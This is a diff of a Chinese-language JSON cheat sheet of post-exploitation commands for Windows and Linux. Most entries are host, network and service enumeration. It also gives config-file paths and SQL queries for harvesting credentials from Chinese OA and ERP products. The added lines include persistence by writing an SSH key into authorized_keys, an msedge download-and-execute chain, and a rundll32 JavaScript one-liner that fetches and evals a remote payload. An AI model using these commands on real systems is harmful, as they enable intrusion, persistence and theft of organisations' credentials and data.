+					{
+						"command": "lsof -i",
+						"describe": "显示打开的网络文件"
+					},
+					{
+						"command": "lsof -i :80",
+						"describe": "查看80端口的连接"
+					},
+					{
+						"command": "grep 80 /etc/services",
+						"describe": "查找80端口的服务信息"
+					},
+					{
+						"command": "netstat -antup",
+						"describe": "显示所有TCP/UDP连接及监听端口"
+					},
+					{
+						"command": "netstat -antpx",
+						"describe": "显示TCP连接及其进程信息"
+					},
+					{
+						"command": "netstat -tulpn",
+						"describe": "显示监听端口及进程"
+					},
+					{
+						"command": "ss -tuln",
+						"describe": "查看简化的监听端口信息"
+					},
+					{
+						"command": "chkconfig --list",
+						"describe": "列出系统服务及其启动状态"
+					},
+					{
+						"command": "chkconfig --list | grep 3:on",
+						"describe": "过滤出在运行级别3中启动的服务"
+					}
+				]
+			},
+			"查看缓存表": {
+				"Windows": [
+					{
+						"command": "ipconfig /displaydns",
+						"describe": "查看DNS缓存表"
+					},
+					{
+						"command": "arp -a",
+						"describe": "显示ARP缓存"
+					}
+				],
+				"Linux": [
+					{
+						"command": "arp -e",
+						"describe": "显示详细的ARP表"
+					},
+					{
+						"command": "route",
+						"describe": "查看路由表"
+					},
+					{
+						"command": "/sbin/route -nee",
+						"describe": "显示详细的路由表信息"
+					}
+				]
+			}
 		},
-		"查看防火墙规则和状态": {
-			"Windows": [
-				{
-					"command": "netsh firewall show config",
-					"describe": "查看防火墙配置"
-				},
-				{
-					"command": "netsh firewall show state",
-					"describe": "查看防火墙状态"
-				},
-				{
-					"command": "netsh advfirewall firewall show rule name=all",
-					"describe": "显示所有防火墙规则"
-				},
-				{
-					"command": "netsh advfirewall show allprofiles",
-					"describe": "查看所有防火墙配置文件"
-				}
-			],
-			"Linux": [
-				{
-					"command": "iptables -L",
-					"describe": "列出当前iptables防火墙规则"
-				},
-				{
-					"command": "ufw status",
-					"describe": "查看UFW防火墙状态"
-				},
-				{
-					"command": "firewall-cmd --list-all",
-					"describe": "列出firewalld的所有规则"
-				}
-			]
-		},
-		"查看系统开放端口": {
-			"Windows": [
-				{
-					"command": "netstat -ano",
-					"describe": "显示所有活动连接和监听端口"
-				}
-			],
-			"Linux": [
-				{
-					"command": "netstat -tulpn",
-					"describe": "显示当前监听的端口及其相关进程"
-				},
-				{
-					"command": "ss -tuln",
-					"describe": "显示监听端口的简化信息"
-				}
-			]
-		},
-		"查看当前网络地址": {
-			"Linux": [
-				{
-					"command": "/sbin/ifconfig -a",
-					"describe": "显示所有网络接口地址"
-				},
-				{
-					"command": "cat /etc/network/interfaces",
-					"describe": "查看网络接口的配置文件"
-				},
-				{
-					"command": "cat /etc/susconfig/network",
-					"describe": "查看系统网络配置"
-				}
-			]
-		},
-		"查看网络配置、DNS、 DHCP、网关": {
-			"Windows": [
-				{
-					"command": "ipconfig /all",
-					"describe": "查看网络配置、DNS、DHCP、网关等信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "cat /etc/resolv.conf",
-					"describe": "查看DNS服务器配置"
-				},
-				{
-					"command": "cat /etc/sysconfig/network",
-					"describe": "查看系统网络配置"
-				},
-				{
-					"command": "cat /etc/networks",
-					"describe": "查看网络名称及对应的IP地址"
-				},
-				{
-					"command": "iptables -L",
-					"describe": "查看当前iptables防火墙规则"
-				},
-				{
-					"command": "hostname",
-					"describe": "查看系统主机名"
-				},
-				{
-					"command": "dnsdomainname",
-					"describe": "查看系统DNS域名"
-				},
-				{
-					"command": "ip a",
-					"describe": "查看本地IP地址信息"
-				},
-				{
-					"command": "nmcli device show",
-					"describe": "显示网络设备的详细信息"
-				}
-			]
-		},
-		"查看网络通信": {
-			"Windows": [
-				{
-					"command": "netstat -an",
-					"describe": "显示所有网络连接"
-				},
-				{
-					"command": "netstat -an | findstr :80",
-					"describe": "查找监听80端口的连接"
-				}
-			],
-			"Linux": [
-				{
-					"command": "lsof -i",
-					"describe": "显示打开的网络文件"
-				},
-				{
-					"command": "lsof -i :80",
-					"describe": "查看80端口的连接"
-				},
-				{
-					"command": "grep 80 /etc/services",
-					"describe": "查找80端口的服务信息"
-				},
-				{
-					"command": "netstat -antup",
-					"describe": "显示所有TCP/UDP连接及监听端口"
-				},
-				{
-					"command": "netstat -antpx",
-					"describe": "显示TCP连接及其进程信息"
-				},
-				{
-					"command": "netstat -tulpn",
-					"describe": "显示监听端口及进程"
-				},
-				{
-					"command": "ss -tuln",
-					"describe": "查看简化的监听端口信息"
-				},
-				{
-					"command": "chkconfig --list",
-					"describe": "列出系统服务及其启动状态"
-				},
-				{
-					"command": "chkconfig --list | grep 3:on",
-					"describe": "过滤出在运行级别3中启动的服务"
-				}
-			]
-		},
-		"查看缓存表": {
-			"Windows": [
-				{
-					"command": "ipconfig /displaydns",
-					"describe": "查看DNS缓存表"
-				},
-				{
-					"command": "arp -a",
-					"describe": "显示ARP缓存"
-				}
-			],
-			"Linux": [
-				{
-					"command": "arp -e",
-					"describe": "显示详细的ARP表"
-				},
-				{
-					"command": "route",
-					"describe": "查看路由表"
-				},
-				{
-					"command": "/sbin/route -nee",
-					"describe": "显示详细的路由表信息"
-				}
-			]
+		"应用程序及服务信息手机": {
+			"查看计划任务": {
+				"Windows": [
+					{
+						"command": "schtasks /query /fo LIST /v",
+						"describe": "查看当前计划任务的详细信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "crontab -l",
+						"describe": "查看当前用户的计划任务"
+					},
+					{
+						"command": "ls -alh /var/spool/cron",
+						"describe": "查看计划任务的目录内容"
+					},
+					{
+						"command": "ls -al /etc/ | grep cron",
+						"describe": "列出/etc目录下与cron相关的文件"
+					},
+					{
+						"command": "ls -al /etc/cron*",
+						"describe": "列出/etc目录中与cron相关的子目录"
+					},
+					{
+						"command": "cat /etc/cron*",
+						"describe": "查看/etc/目录中所有与cron相关的配置文件内容"
+					},
+					{
+						"command": "cat /etc/at.allow",
+						"describe": "查看允许执行at命令的用户列表"
+					},
+					{
+						"command": "cat /etc/at.deny",
+						"describe": "查看禁止执行at命令的用户列表"
+					},
+					{
+						"command": "cat /etc/cron.allow",
+						"describe": "查看允许使用cron的用户列表"
+					},
+					{
+						"command": "cat /etc/cron.deny",
+						"describe": "查看禁止使用cron的用户列表"
+					},
+					{
+						"command": "cat /etc/crontab",
+						"describe": "查看系统级别的crontab文件内容"
+					},
+					{
+						"command": "cat /etc/anacrontab",
+						"describe": "查看anacron的计划任务配置"
+					},
+					{
+						"command": "cat /var/spool/cron/crontabs/root",
+						"describe": "查看root用户的计划任务"
+					}
+				]
+			},
+			"查看安装驱动": {
+				"Windows": [
+					{
+						"command": "driverquery",
+						"describe": "列出系统中所有已安装的驱动程序"
+					},
+					{
+						"command": "wmic driver get Caption,Manufacturer,Version",
+						"describe": "查看已安装驱动的详细信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "lshw -C network",
+						"describe": "查看网络硬件驱动信息"
+					},
+					{
+						"command": "lspci -nn | grep -i vga",
+						"describe": "查看图形显示驱动信息"
+					},
+					{
+						"command": "lsmod",
+						"describe": "查看已加载的内核模块（驱动）"
+					},
+					{
+						"command": "lspci -v",
+						"describe": "查看所有PCI设备的详细信息"
+					}
+				]
+			},
+			"查看安装程序和版本信息": {
+				"Windows": [
+					{
+						"command": "wmic product list brief",
+						"describe": "查看所有已安装的程序及其版本信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "dpkg -l",
+						"describe": "列出已安装的Debian软件包"
+					},
+					{
+						"command": "rpm -qa",
+						"describe": "列出已安装的RPM包"
+					},
+					{
+						"command": "snap list",
+						"describe": "列出通过snap安装的程序"
+					}
+				]
+			},
+			"查看服务": {
+				"Windows": [
+					{
+						"command": "sc query",
+						"describe": "查看系统中所有服务的状态"
+					},
+					{
+						"command": "wmic service list brief",
+						"describe": "列出所有系统服务及其状态"
+					}
+				],
+				"Linux": [
+					{
+						"command": "systemctl list-units --type=service",
+						"describe": "查看所有正在运行的系统服务"
+					},
+					{
+						"command": "service --status-all",
+						"describe": "查看所有服务的状态"
+					},
+					{
+						"command": "chkconfig --list",
+						"describe": "列出所有服务及其运行级别"
+					}
+				]
+			},
+			"查看进程": {
+				"Windows": [
+					{
+						"command": "tasklist",
+						"describe": "列出所有正在运行的进程"
+					},
+					{
+						"command": "wmic process list brief",
+						"describe": "列出正在运行的进程的简要信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "ps aux",
+						"describe": "列出所有进程，包括不属于当前终端的进程"
+					},
+					{
+						"command": "ps -ef",
+						"describe": "显示所有进程的详细信息"
+					},
+					{
+						"command": "top",
+						"describe": "动态显示系统中占用资源最多的进程"
+					}
+				]
+			},
+			"查看启动程序信息": {
+				"Windows": [
+					{
+						"command": "wmic startup list brief",
+						"describe": "查看系统中所有启动程序的简要信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "ls /etc/init.d/",
+						"describe": "列出所有系统启动脚本"
+					},
+					{
+						"command": "systemctl list-unit-files | grep enabled",
+						"describe": "查看所有已启用的服务"
+					},
+					{
+						"command": "chkconfig --list | grep 3:on",
+						"describe": "查看启动级别为3的所有已启用服务"
+					}
+				]
+			},
+			"查看远程桌面端口": {
+				"Windows": [
+					{
+						"command": "for /f \"tokens=2\" %i in ('tasklist /FI \"SERVICES eq TermService\" /NH') do netstat -ano | findstr %i | findstr LISTENING",
+						"describe": "查找远程桌面服务的端口"
+					}
+				],
+				"Linux": [
+					{
+						"command": "sudo netstat -tuln | grep LISTEN",
+						"describe": "查看正在监听的端口"
+					},
+					{
+						"command": "sudo ss -tuln | grep LISTEN",
+						"describe": "查看监听的套接字信息"
+					},
+					{
+						"command": "sudo lsof -i -P | grep xrdp",
+						"describe": "查找远程桌面服务的相关端口"
+					}
+				]
+			},
+			"设置终端代理": {
+				"Windows": [
+					{
+						"command": "set http_proxy=http://127.0.0.1:7890 & set https_proxy=http://127.0.0.1:7890",
+						"describe": "为Windows终端设置HTTP和HTTPS代理"
+					}
+				],
+				"Linux": [
+					{
+						"command": "export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890",
+						"describe": "为Linux终端设置HTTP和HTTPS代理"
+					}
+				]
+			},
+			"查看.msi程序的执行权限": {
+				"Windows": [
+					{
+						"command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+						"describe": "查看当前用户的MSI安装程序的执行权限"
+					},
+					{
+						"command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+						"describe": "查看本地机器的MSI安装程序的执行权限"
+					}
+				],
+				"Linux": [
+					{
+						"command": "dpkg-statoverride --list",
+						"describe": "查看Debian包管理系统中的权限覆盖设置"
+					},
+					{
+						"command": "stat -c '%a' /path/to/file",
+						"describe": "查看特定文件的权限"
+					}
+				]
+			},
+			"查看是否设置setuid、setgid": {
+				"Windows": [
+					{
+						"command": "reg HKEY_Local_Machine\\System\\CurrentControlSet\\Services\\NfsSvr\\Parameters\\SafeSetUidGidBits",
+						"describe": "检查NFS服务器是否启用了安全的setuid和setgid位"
+					}
+				],
+				"Linux": [
+					{
+						"command": "find / -perm /6000",
+						"describe": "查找系统中具有setuid或setgid权限的文件"
+					},
+					{
+						"command": "ls -ld /usr/bin/sudo",
+						"describe": "检查sudo程序是否设置了setuid位"
+					}
+				]
+			},
+			"查看安装补丁和时间信息": {
+				"Windows": [
+					{
+						"command": "wmic qfe get Caption,Description,HotFixID,InstalledOn",
+						"describe": "列出已安装的Windows补丁及其安装日期"
+					}
+				],
+				"Linux": [
+					{
+						"command": "dpkg-query -l | grep linux-headers",
+						"describe": "查看安装的Linux内核头文件版本"
+					},
+					{
+						"command": "yum list installed",
+						"describe": "列出通过yum安装的所有软件包及补丁"
+					}
+				]
+			},
+			"查看特定漏洞补丁信息": {
+				"Windows": [
+					{
+						"command": "wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:\"KBxxxxxxxx\"",
+						"describe": "查找特定KB编号的补丁安装信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "dpkg-query -l | grep 'KBxxxxxx'",
+						"describe": "查找特定KB编号的Debian包补丁"
+					},
+					{
+						"command": "rpm -qa | grep 'KBxxxxxx'",
+						"describe": "查找特定KB编号的RPM包补丁"
+					}
+				]
+			},
+			"查看系统进程": {
+				"Windows": [
+					{
+						"command": "tasklist /svc",
+						"describe": "列出所有正在运行的进程及其相关服务"
+					}
+				],
+				"Linux": [
+					{
+						"command": "ps aux",
+						"describe": "列出所有进程及其详细信息"
+					},
+					{
+						"command": "top",
+						"describe": "动态查看系统中的进程使用情况"
+					}
+				]
+			},
+			"列出详细进程": {
+				"Windows": [
+					{
+						"command": "tasklist /V /FO CSV",
+						"describe": "以CSV格式列出详细的进程信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "ps aux --forest",
+						"describe": "以树状结构显示进程及其父子关系"
+					},
+					{
+						"command": "htop",
+						"describe": "以交互界面方式动态显示进程信息"
+					}
+				]
+			},
+			"查看正在运行的程序及对应的用户权限": {
+				"Windows": [
+					{
+						"command": "tasklist /v",
+						"describe": "查看运行中的进程及其用户权限的详细信息"
+					}
+				],
+				"Linux": [
+					{
+						"command": "ps aux",
+						"describe": "列出所有进程及其对应的用户和权限"
+					},
+					{
+						"command": "ps -ef",
+						"describe": "查看进程的详细信息，包括用户权限"
+					},
+					{
+						"command": "top",
+						"describe": "动态查看系统中的进程及其资源使用和权限"
+					},
+					{
+						"command": "cat /etc/services",
+						"describe": "查看系统服务及其端口号和权限配置"
+					}
+				]
+			},
+			"查看以root/System权限运行的进程": {
+				"Windows": [
+					{
+						"command": "tasklist /FI \"USERNAME eq SYSTEM\"",
+						"describe": "查看以SYSTEM用户权限运行的进程"
+					}
+				],
+				"Linux": [
+					{
+						"command": "ps aux | grep root",
+						"describe": "查找所有以root用户权限运行的进程"
+					},
+					{
+						"command": "ps -ef | grep root",
+						"describe": "列出所有以root权限运行的详细进程信息"
+					}
+				]
+			},
+			"查看安装的应用": {
+				"Windows": [
+					{
+						"command": "wmic product get Name,Version",
+						"describe": "列出所有已安装的应用程序及其版本号"
+					}
+				],
+				"Linux": [
+					{
+						"command": "ls -alh /usr/bin/",
+						"describe": "查看/usr/bin目录中的所有已安装程序"
+					},
+					{
+						"command": "ls -alh /sbin/",
+						"describe": "查看/sbin目录中的所有已安装程序"
+					},
+					{
+						"command": "dpkg -l",
+						"describe": "列出所有通过dpkg安装的应用程序"
+					},
+					{
+						"command": "rpm -qa",
+						"describe": "列出所有通过RPM包管理器安装的应用程序"
+					},
+					{
+						"command": "ls -alh /var/cache/apt/archives",
+						"describe": "查看APT包管理器缓存的安装文件"
+					},
+					{
+						"command": "ls -alh /var/cache/yum/",
+						"describe": "查看YUM包管理器缓存的安装文件"
+					}
+				]
+			}
 		}
 	},
-	"获取应用程序及服务信息": {
-		"查看计划任务": {
-			"Windows": [
-				{
-					"command": "schtasks /query /fo LIST /v",
-					"describe": "查看当前计划任务的详细信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "crontab -l",
-					"describe": "查看当前用户的计划任务"
-				},
-				{
-					"command": "ls -alh /var/spool/cron",
-					"describe": "查看计划任务的目录内容"
-				},
-				{
-					"command": "ls -al /etc/ | grep cron",
-					"describe": "列出/etc目录下与cron相关的文件"
-				},
-				{
-					"command": "ls -al /etc/cron*",
-					"describe": "列出/etc目录中与cron相关的子目录"
-				},
-				{
-					"command": "cat /etc/cron*",
-					"describe": "查看/etc/目录中所有与cron相关的配置文件内容"
-				},
-				{
-					"command": "cat /etc/at.allow",
-					"describe": "查看允许执行at命令的用户列表"
-				},
-				{
-					"command": "cat /etc/at.deny",
-					"describe": "查看禁止执行at命令的用户列表"
-				},
-				{
-					"command": "cat /etc/cron.allow",
-					"describe": "查看允许使用cron的用户列表"
-				},
-				{
-					"command": "cat /etc/cron.deny",
-					"describe": "查看禁止使用cron的用户列表"
-				},
-				{
-					"command": "cat /etc/crontab",
-					"describe": "查看系统级别的crontab文件内容"
-				},
-				{
-					"command": "cat /etc/anacrontab",
-					"describe": "查看anacron的计划任务配置"
-				},
-				{
-					"command": "cat /var/spool/cron/crontabs/root",
-					"describe": "查看root用户的计划任务"
-				}
-			]
+	"敏感数据收集": {
+		"常见数据库配置路径": {
+			"用友NC": {
+				"Windows": [
+					{
+						"command": "C:\\yonyou\\nchome\\ierp\\bin\\prop.xml",
+						"describe": "配置文件路径"
+					}
+				]
+			},
+			"泛微e-cology": {
+				"Windows": [
+					{
+						"command": "用户名表：HrmResource \n\n管理员表：HrmResourceManager、TB_USER\n\nC:\\WEAVER\\ecology\\WEB-INF\\prop\\weaver.properties\n\n查看角色信息表\nSELECT count(*) FROM [ecology_wzy].[dbo].[HrmRoles]\nSELECT TOP (1000) * FROM [ecology_wzy].[dbo].[HrmRoles]\n\n查看部门信息表\nSELECT TOP (1000) * FROM [ecology_wzy].[dbo].[HrmDepartment]\n\n人力资源基本信息表\nSELECT count(*) FROM [ecology_wzy].[dbo].[HrmResource]\nSELECT TOP (1000) * FROM [ecology_wzy].[dbo].[HrmResource]",
+						"describe": "常用信息"
+					}
+				]
+			},
+			"泛微e-bridge": {
+				"Windows": [
+					{
+						"command": "C:\\ebridge\\tomcat\\webapps\\ROOT\\WEB-INF\\init.properties",
+						"describe": "数据库配置文件路径"
+					}
+				]
+			},
+			"泛微e-mobile": {
+				"Windows": [
+					{
+						"command": "C:\\WEAVER\\emobile\\webapps\\ROOT\\WEB-INF\\classes\\application.properties",
+						"describe": "数据库配置文件路径"
+					}
+				]
+			},
+			"泛微e-office": {
+				"Windows": [
+					{
+						"command": "C:\\eoffice\\webroot\\inc\\oa_config.php\nC:\\eoffice\\bin\\mysql_config.ini",
+						"describe": "配置文件路径"
+					}
+				]
+			},
+			"致远OA": {
+				"Linux": [
+					{
+						"command": "/opt/Seeyon/A8/base/conf/datasourceCtp.properties",
+						"describe": "数据库配置文件路径"
+					}
+				]
+			},
+			"蓝凌OA": {
+				"Windows": [
+					{
+						"command": "\\WEB-INF\\KmssConfig\\sys\\config\\struts.xml",
+						"describe": "老版本配置文件路径"
+					},
+					{
+						"command": "\\WEB-INF\\KmssConfig\\sys\\config\\spring-safe.xml",
+						"describe": "新版本配置文件路径"
+					},
+					{
+						"command": "\\WEB-INF\\KmssConfig\\sys\\config\\spring-mvc.xml",
+						"describe": "新版本配置文件路径"
+					},
+					{
+						"command": "/WEB-INF/KmssConfig/admin.properties",
+						"describe": "后台管理密码文件路径"
+					}
+				]
+			},
+			"天擎": {
+				"Windows": [
+					{
+						"command": "C:\\Program Files (x86)\\360\\skylar6\\www\\config\\custom_config.json",
+						"describe": "配置文件路径"
+					}
+				]
+			}
 		},
-		"查看安装驱动": {
-			"Windows": [
-				{
-					"command": "driverquery",
-					"describe": "列出系统中所有已安装的驱动程序"
-				},
-				{
-					"command": "wmic driver get Caption,Manufacturer,Version",
-					"describe": "查看已安装驱动的详细信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "lshw -C network",
-					"describe": "查看网络硬件驱动信息"
-				},
-				{
-					"command": "lspci -nn | grep -i vga",
-					"describe": "查看图形显示驱动信息"
-				},
-				{
-					"command": "lsmod",
-					"describe": "查看已加载的内核模块（驱动）"
-				},
-				{
-					"command": "lspci -v",
-					"describe": "查看所有PCI设备的详细信息"
-				}
-			]
-		},
-		"查看安装程序和版本信息": {
-			"Windows": [
-				{
-					"command": "wmic product list brief",
-					"describe": "查看所有已安装的程序及其版本信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "dpkg -l",
-					"describe": "列出已安装的Debian软件包"
-				},
-				{
-					"command": "rpm -qa",
-					"describe": "列出已安装的RPM包"
-				},
-				{
-					"command": "snap list",
-					"describe": "列出通过snap安装的程序"
-				}
-			]
-		},
-		"查看服务": {
-			"Windows": [
-				{
-					"command": "sc query",
-					"describe": "查看系统中所有服务的状态"
-				},
-				{
-					"command": "wmic service list brief",
-					"describe": "列出所有系统服务及其状态"
-				}
-			],
-			"Linux": [
-				{
-					"command": "systemctl list-units --type=service",
-					"describe": "查看所有正在运行的系统服务"
-				},
-				{
-					"command": "service --status-all",
-					"describe": "查看所有服务的状态"
-				},
-				{
-					"command": "chkconfig --list",
-					"describe": "列出所有服务及其运行级别"
-				}
-			]
-		},
-		"查看进程": {
-			"Windows": [
-				{
-					"command": "tasklist",
-					"describe": "列出所有正在运行的进程"
-				},
-				{
-					"command": "wmic process list brief",
-					"describe": "列出正在运行的进程的简要信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "ps aux",
-					"describe": "列出所有进程，包括不属于当前终端的进程"
-				},
-				{
-					"command": "ps -ef",
-					"describe": "显示所有进程的详细信息"
-				},
-				{
-					"command": "top",
-					"describe": "动态显示系统中占用资源最多的进程"
-				}
-			]
-		},
-		"查看启动程序信息": {
-			"Windows": [
-				{
-					"command": "wmic startup list brief",
-					"describe": "查看系统中所有启动程序的简要信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "ls /etc/init.d/",
-					"describe": "列出所有系统启动脚本"
-				},
-				{
-					"command": "systemctl list-unit-files | grep enabled",
-					"describe": "查看所有已启用的服务"
-				},
-				{
-					"command": "chkconfig --list | grep 3:on",
-					"describe": "查看启动级别为3的所有已启用服务"
-				}
-			]
-		},
-		"查看远程桌面端口": {
-			"Windows": [
-				{
-					"command": "for /f \"tokens=2\" %i in ('tasklist /FI \"SERVICES eq TermService\" /NH') do netstat -ano | findstr %i | findstr LISTENING",
-					"describe": "查找远程桌面服务的端口"
-				}
-			],
-			"Linux": [
-				{
-					"command": "sudo netstat -tuln | grep LISTEN",
-					"describe": "查看正在监听的端口"
-				},
-				{
-					"command": "sudo ss -tuln | grep LISTEN",
-					"describe": "查看监听的套接字信息"
-				},
-				{
-					"command": "sudo lsof -i -P | grep xrdp",
-					"describe": "查找远程桌面服务的相关端口"
-				}
-			]
-		},
-		"设置终端代理": {
-			"Windows": [
-				{
-					"command": "set http_proxy=http://127.0.0.1:7890 & set https_proxy=http://127.0.0.1:7890",
-					"describe": "为Windows终端设置HTTP和HTTPS代理"
-				}
-			],
-			"Linux": [
-				{
-					"command": "export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890",
-					"describe": "为Linux终端设置HTTP和HTTPS代理"
-				}
-			]
-		},
-		"查看.msi程序的执行权限": {
-			"Windows": [
-				{
-					"command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
-					"describe": "查看当前用户的MSI安装程序的执行权限"
-				},
-				{
-					"command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
-					"describe": "查看本地机器的MSI安装程序的执行权限"
-				}
-			],
-			"Linux": [
-				{
-					"command": "dpkg-statoverride --list",
-					"describe": "查看Debian包管理系统中的权限覆盖设置"
-				},
-				{
-					"command": "stat -c '%a' /path/to/file",
-					"describe": "查看特定文件的权限"
-				}
-			]
-		},
-		"查看是否设置setuid、setgid": {
-			"Windows": [
-				{
-					"command": "reg HKEY_Local_Machine\\System\\CurrentControlSet\\Services\\NfsSvr\\Parameters\\SafeSetUidGidBits",
-					"describe": "检查NFS服务器是否启用了安全的setuid和setgid位"
-				}
-			],
-			"Linux": [
-				{
-					"command": "find / -perm /6000",
-					"describe": "查找系统中具有setuid或setgid权限的文件"
-				},
-				{
-					"command": "ls -ld /usr/bin/sudo",
-					"describe": "检查sudo程序是否设置了setuid位"
-				}
-			]
-		},
-		"查看安装补丁和时间信息": {
-			"Windows": [
-				{
-					"command": "wmic qfe get Caption,Description,HotFixID,InstalledOn",
-					"describe": "列出已安装的Windows补丁及其安装日期"
-				}
-			],
-			"Linux": [
-				{
-					"command": "dpkg-query -l | grep linux-headers",
-					"describe": "查看安装的Linux内核头文件版本"
-				},
-				{
-					"command": "yum list installed",
-					"describe": "列出通过yum安装的所有软件包及补丁"
-				}
-			]
-		},
-		"查看特定漏洞补丁信息": {
-			"Windows": [
-				{
-					"command": "wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:\"KBxxxxxxxx\"",
-					"describe": "查找特定KB编号的补丁安装信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "dpkg-query -l | grep 'KBxxxxxx'",
-					"describe": "查找特定KB编号的Debian包补丁"
-				},
-				{
-					"command": "rpm -qa | grep 'KBxxxxxx'",
-					"describe": "查找特定KB编号的RPM包补丁"
-				}
-			]
-		},
-		"查看系统进程": {
-			"Windows": [
-				{
-					"command": "tasklist /svc",
-					"describe": "列出所有正在运行的进程及其相关服务"
-				}
-			],
-			"Linux": [
-				{
-					"command": "ps aux",
-					"describe": "列出所有进程及其详细信息"
-				},
-				{
-					"command": "top",
-					"describe": "动态查看系统中的进程使用情况"
-				}
-			]
-		},
-		"列出详细进程": {
-			"Windows": [
-				{
-					"command": "tasklist /V /FO CSV",
-					"describe": "以CSV格式列出详细的进程信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "ps aux --forest",
-					"describe": "以树状结构显示进程及其父子关系"
-				},
-				{
-					"command": "htop",
-					"describe": "以交互界面方式动态显示进程信息"
-				}
-			]
-		},
-		"查看正在运行的程序及对应的用户权限": {
-			"Windows": [
-				{
-					"command": "tasklist /v",
-					"describe": "查看运行中的进程及其用户权限的详细信息"
-				}
-			],
-			"Linux": [
-				{
-					"command": "ps aux",
-					"describe": "列出所有进程及其对应的用户和权限"
-				},
-				{
-					"command": "ps -ef",
-					"describe": "查看进程的详细信息，包括用户权限"
-				},
-				{
-					"command": "top",
-					"describe": "动态查看系统中的进程及其资源使用和权限"
-				},
-				{
-					"command": "cat /etc/services",
-					"describe": "查看系统服务及其端口号和权限配置"
-				}
-			]
-		},
-		"查看以root/System权限运行的进程": {
-			"Windows": [
-				{
-					"command": "tasklist /FI \"USERNAME eq SYSTEM\"",
-					"describe": "查看以SYSTEM用户权限运行的进程"
-				}
-			],
-			"Linux": [
-				{
-					"command": "ps aux | grep root",
-					"describe": "查找所有以root用户权限运行的进程"
-				},
-				{
-					"command": "ps -ef | grep root",
-					"describe": "列出所有以root权限运行的详细进程信息"
-				}
-			]
-		},
-		"查看安装的应用": {
-			"Windows": [
-				{
-					"command": "wmic product get Name,Version",
-					"describe": "列出所有已安装的应用程序及其版本号"
-				}
-			],
-			"Linux": [
-				{
-					"command": "ls -alh /usr/bin/",
-					"describe": "查看/usr/bin目录中的所有已安装程序"
-				},
-				{
-					"command": "ls -alh /sbin/",
-					"describe": "查看/sbin目录中的所有已安装程序"
-				},
-				{
-					"command": "dpkg -l",
-					"describe": "列出所有通过dpkg安装的应用程序"
-				},
-				{
-					"command": "rpm -qa",
-					"describe": "列出所有通过RPM包管理器安装的应用程序"
-				},
-				{
-					"command": "ls -alh /var/cache/apt/archives",
-					"describe": "查看APT包管理器缓存的安装文件"
-				},
-				{
-					"command": "ls -alh /var/cache/yum/",
-					"describe": "查看YUM包管理器缓存的安装文件"
-				}
-			]
-		}
-	},
-	"获取敏感数据和目录": {
 		"搜索D盘磁盘名字为logo.jpg的文件": {
 			"Windows": [
 				{
@@ -1577,6 +1835,10 @@
 					"describe": "查看SSH授权密钥"
 				},
 				{
+					"command": "echo c3NoLXJzYSBBQQ== | base64 -d > authorized_keys",
+					"describe": "写入ssh公钥"
+				},
+				{
 					"command": "cat ~/.ssh/identity.pub",
 					"describe": "查看SSH身份公钥"
 				},
@@ -1671,9 +1933,17 @@
 					"describe": "在所有PHP文件中搜索包含'var $password'的行，并显示行号"
 				}
 			]
+		},
+		"敏感配置文件解密": {
+			"Windows": [
+				{
+					"command": "PotatoTool",
+					"describe": "请直接使用PotatoTool一键解密尝试"
+				}
+			]
 		}
 	},
-	"添加用户": {
+	"用户管理": {
 		"添加用户并设置密码": {
 			"Windows": [
 				{
@@ -1879,6 +2149,14 @@
 				{
 					"command": "bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\\Pstools.zip",
 					"describe": "使用bitsadmin从指定URL下载文件并保存到指定路径"
+				},
+				{
+					"command": "cmd /c start /min msedge.exe http://127.0.0.1/test.zip && timeout 5 && taskkill /f /t /im msedge.exe && C:/Users/%UserName%/Downloads/test.zip",
+					"describe": "使用msedge下载并执行"
+				},
+				{
+					"command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.3.150/chfs/shared/1Z3.exe\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}",
+					"describe": "rundll32下载文件"
 				}
 			],
 			"Linux": [
@@ -1915,356 +2193,768 @@
 			]
 		}
 	},
-	"常用工具命令": {
-		"nmap扫描永恒之蓝漏洞": {
-			"Windows": [
-				{
-					"command": "nmap -p445 --script smb-vuln-ms17-010 127.0.0.1",
-					"describe": "使用nmap扫描目标IP的445端口，检查是否存在永恒之蓝漏洞"
+	"常用工具与命令": {
+		"工具命令": {
+			"wmic": {
+				"wmic远程连接机器": {
+					"Windows": [
+						{
+							"command": "wmic /node:\"192.168.1.20\" /user:\"domain\\administrator\" /password:\"123456\"",
+							"describe": "使用wmic远程连接到指定IP的机器，并以指定用户和密码进行认证"
+						}
+					]
+				},
+				"查看系统安装软件": {
+					"Windows": [
+						{
+							"command": "wmic product get name,version",
+							"describe": "列出系统中安装的软件及其版本信息"
+						}
+					]
+				},
+				"查看系统版本": {
+					"Windows": [
+						{
+							"command": "wmic OS get Caption,CSDVersion,OSArchitecture,Version",
